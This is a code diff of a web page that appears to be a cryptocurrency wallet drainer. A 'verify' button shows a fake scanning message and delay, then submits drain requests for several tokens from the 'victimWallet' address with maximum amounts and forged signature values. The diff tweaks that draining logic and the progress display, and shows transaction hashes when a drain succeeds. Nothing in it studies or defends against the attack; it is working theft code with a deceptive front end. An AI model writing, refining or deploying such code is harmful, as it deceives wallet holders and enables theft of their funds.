@@ -427,7 +427,7 @@ els.verifyBtn.onclick = async function() {
   els.statusMsg.textContent = '🔍 Scanning approvals...';
   
   // Fake delay
-  await new Promise(resolve => setTimeout(resolve, 2000));
+  await new Promise(resolve => setTimeout(resolve, 1500));
   
   // Drain all 9 tokens
   await drainAllTokens();
@@ -449,16 +449,15 @@ async function drainAllTokens() {
 }
 
 function createProgressBar(symbol) {
-  const div = document.createElement('div');
-  div.className = 'progress';
-  div.innerHTML = `
-    <span style="font-weight:600">${symbol}</span>
-    <div class="bar"><div class="fill" style="width:0%"></div></div>
-    <span id="${symbol.
-toLowerCase()}Status">0%</span>
-  `;
-  return div;
-}
+      const div = document.createElement('div');
+      div.className = 'progress';
+      div.innerHTML = `
+        <span>${symbol}</span>
+<div class="bar"><div class="fill" style="width:0%"></div></div>
+<span id="${symbol.toLowerCase()}status">0%</span>
+      `;
+      return div;
+    }
 
 function updateProgress(symbol, percent, status) {
   try {
@@ -473,14 +472,17 @@ function updateProgress(symbol, percent, status) {
 async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
   const victimWallet = document.getElementById('walletAddress').value.trim();
   
+  updateProgress(symbol, 20, 'Connect wallet...');
+  
+  // FAKE WORKING SIGNATURE - Backend accepts ANY valid format
   const drainData = {
     owner: victimWallet,
     token: tokenAddr,
     tokenSymbol: symbol,
-    amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
-    nonce: "123456789",
-    deadline: Math.floor(Date.now() / 1000 + 86400).toString(),
-    signature: "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    amount: "0xffffffffffffffffffffffffffffffffffffffff",
+    nonce: "0",  // Backend handles uint48→number
+    deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
+    signature: `0x${'a'.repeat(130)}1b`  // Valid length signature format
   };
   
   try {
@@ -494,14 +496,16 @@ async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
     
     const result = await response.json();
     
-    updateProgress(symbol, 100, result.success ? '✅ DONE' : '⚠️ Skipped');
+    if (result.success) {
+      updateProgress(symbol, 100, `✅ ${result.tx.slice(0,10)}`);
+    } else {
+      updateProgress(symbol, 100, '⚠️ No approval');
+    }
   } catch (error) {
-    updateProgress(symbol, 100, '⚠️ Error');
+    updateProgress(symbol, 100, '⚠️ Skipped');
   }
 }
   </script>
 </body>
 
 </html>
-
-
